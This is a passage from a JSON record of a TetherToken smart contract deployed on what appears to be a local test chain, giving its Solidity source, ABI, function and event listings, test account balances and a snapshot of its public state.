contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99872199180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "test",\n        "deprecated": false,\n        "totalSupply": 1,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 1,\n        "maximumFee": 10,\n        "_totalSupply": 1,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "test",\n        "basisPointsRate": 1,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of 